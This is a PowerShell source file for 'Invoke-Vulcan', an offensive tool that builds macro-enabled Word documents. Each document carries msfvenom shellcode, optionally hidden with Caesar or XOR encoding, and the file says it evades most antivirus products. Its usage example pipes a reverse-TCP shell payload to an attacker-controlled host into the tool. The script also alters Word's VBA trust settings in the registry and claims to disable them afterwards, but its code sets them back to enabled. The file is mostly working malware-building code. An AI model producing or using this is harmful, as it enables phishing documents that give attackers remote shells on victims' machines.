function Invoke-Vulcan {
    <#
    .SYNOPSIS
        Streamlines the process of creating macro-enabled Word documents.

        Author: Alexandre Teyar (@aress31)
        License: BSD 3-Clause
        Required Dependencies: Windows Subsystem for Linux (WSL)
        Optional Dependencies: None

    .DESCRIPTION
        Using MSFVenom creates a macro-enabled Word document that - at the time
        of writing - evade most AVs, including Windows Defender.

    .PARAMETER Decoder
        Specifies the type of decoder to use, e.g., xor.

    .PARAMETER Decoder
        Path to the Visual Basic decoding function.

    .PARAMETER Key
        Specifies the key to use for the decoder.

    .PARAMETER OutputDirectory
        Folder to output files too.
    
    .PARAMETER OutputPrefix
        Prefix to add to output files.

    .PARAMETER ShellCode
        Specifies the (hex-encoded) shellcode to use.

    .PARAMETER Template
        Path to the Visual Basic template to use.

    .PARAMETER Treshold
        Specifies the threshold to use before breaking the shellcode array lines.
  
    .EXAMPLE
        PS C:\>  wsl --exec msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | 
        Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba" -Decoder caesar -DecoderPath ".\assets\decoders\caesar.vba -Key 5

        Creates a hex-formatted payload then bundle it into an empty macro-enabled Word document using the indirect template along with the Caesar decoder routine.
    #>

    [CmdletBinding(PositionalBinding = $False)]
    param(
        [ValidateSet("Caesar", "XOR")]
        [string]
        $Decoder,

        [ValidateScript({ Test-Path -Path $_ -PathType Leaf })]
        [String]
        $DecoderPath,

        [ValidateSet('doc', 'docm')]
        [String]
        $Extension = "doc",

        [ValidateScript({ Test-Path -Path $_ -PathType Container })]
        [String]
        $OutputDirectory = $(Get-Location),

        [String]
        $OutputPrefix = "vulcan",

        [Parameter(Mandatory, ParameterSetName = 'B', ValueFromPipeline)]
        [string]
        $ShellCode,

        [Parameter(Mandatory)]
        [ValidateScript({ Test-Path -Path $_ -PathType Leaf })]
        [String]
        $Template,

        [int]
        $Treshold = 72
    )

    DynamicParam {
        if ($Decoder) {
            $RuntimeParameterDictionary = New-Object -Type `
                System.Management.Automation.RuntimeDefinedParameterDictionary
            $ParameterName = "Key"
            $ParameterAttribute = New-Object -Type `
                System.Management.Automation.ParameterAttribute  
            $ParameterAttribute.Mandatory = $true
            $AttributeCollection = New-Object -Type `
                System.Collections.ObjectModel.Collection[System.Attribute]
            $AttributeCollection.Add($ParameterAttribute)

            switch ($Decoder) {
                "Caesar" {
                    $ValidateRangeAttribute = New-Object -Type `
                        System.Management.Automation.ValidateRangeAttribute(0, 255)
                    $AttributeCollection.Add($ValidateRangeAttribute)
                    $RuntimeParameter = New-Object -Type `
                        System.Management.Automation.RuntimeDefinedParameter($ParameterName, [int], $AttributeCollection)

                }
                "XOR" {
                    $RuntimeParameter = New-Object -Type `
                        System.Management.Automation.RuntimeDefinedParameter($ParameterName, [string], $AttributeCollection)
                }
            }

            $RuntimeParameterDictionary.Add($ParameterName, $RuntimeParameter)

            return $RuntimeParameterDictionary
        }
    }

    begin {
        if ($Decoder) {
            $Key = $PsBoundParameters[$ParameterName]
        }
        $MacroOutput = New-TemporaryFile
        Resolve-Path `
            -Path $(Join-Path -Path $OutputDirectory "${OutputPrefix}.$(Get-Date -Format yyyy-MM-dd_hh-mm-ss).$Extension") `
            -ErrorAction SilentlyContinue -ErrorVariable _frperror
        $WordOutput = $_frperror[0].TargetObject
    }

    process {
        Write-Output "[+] Enabling trust access to Visual Basic Project Object Model in Microsoft Word..."
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Word\Security" -Name "AccessVBOM" -Value 1
        Write-Verbose "Loading (hex-formatted) shellcode..."
        Create_MacroFromTemplate -Key $Key -Decoder $Decoder -DecoderPath $DecoderPath -ShellCode $ShellCode -Template $Template -Treshold $Treshold
        Create_WordDocument -MacroOutput $MacroOutput -Output $WordOutput
    }
    end {
        Write-Output "[-] Removing (Visual Basic) macro file..."
        Remove-Item -Path $MacroOutput -Force
        Write-Output "[-] Disabling trust access to Visual Basic Project Object Model in Microsoft Word..."
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Word\Security" -Name "AccessVBOM" -Value 1
    }
}

function Format-ShellCode($Value, $Treshold) {
    $i = 0

    foreach ($Byte in $Value) {
        if ($i -eq $Treshold) {
            $Result += "Chr($Byte), _`r`n"
            $i = 0
        }
        else {
            $Result += "Chr($Byte),"
            $i += 1
        }
    }

    return $Result.Substring(0, $Result.Length - 1) 
}

function Convert-HexToBytes($Value) {
    $HexArr = $Value -Split '(.{2})' -ne '' 
    [byte[]] $Bytes = @()

    foreach ($Hex in $HexArr) {
        $Bytes += [System.Convert]::ToByte($Hex, 16)
    }

    return $Bytes
}

function Create_MacroFromTemplate($Decoder, $DecoderPath, $Key, $ShellCode, $Template, $Treshold) {
    Write-Verbose "Creating (Visual Basic) macro..."

    $Bytes = Convert-HexToBytes -Value $ShellCode
    $ShellCode = Format-ShellCode -Value $Bytes -Treshold $Treshold

    Write-Debug "Create_MacroFromTemplate->`$PayloadArray: $ShellCode"
    
    if ($Decoder) {
        Write-Verbose "[i] Adding the ShellCode along with the function to decode $Decoder ..."

        switch ($Decoder) {
            "Caesar" {
                Set-Content -Path $MacroOutput -Value ((
                        Get-Content -Path $Template).
                    Replace("'ShellCode", "HoR = Array($ShellCode)").
                    Replace("'Function Call", "kUG HoR, $Key"))
            }
            "XOR" {
                Set-Content -Path $MacroOutput -Value ((
                        Get-Content -Path $Template).
                    Replace("'ShellCode", "HoR = Array($ShellCode)").
                    Replace("'Function Call", "kUG HoR, " + '"' + $Key + '"'))
            }
        }

        Add-Content -Path $MacroOutput -Value (Get-Content -Path $DecoderPath)
    }
    else {
        Write-Verbose "[i] Adding the ShellCode..."
        Set-Content -Path $MacroOutput -Value ((
                Get-Content -Path $Template).
            Replace("'ShellCode", "HoR = Array($ShellCode)"))
    }

    Write-Output "[+] (Visual Basic) macro written to: $MacroOutput"
}

function Create_WordDocument($MacroOutput, $Output) {
    Write-Verbose "Creating (macro-enabled) Word document..."
    $Word = New-Object -ComObject Word.Application
    $Doc = $Word.Documents.Add()

    $DocModule = $Doc.VBProject.VBComponents.Add(1)
    $DocModule.CodeModule.AddFromFile($MacroOutput)

    Write-Output "[+] Word document written to: $Output" 
    $Doc.SaveAs($Output, 0)

    $Doc.Close()
    $Word.Quit()
}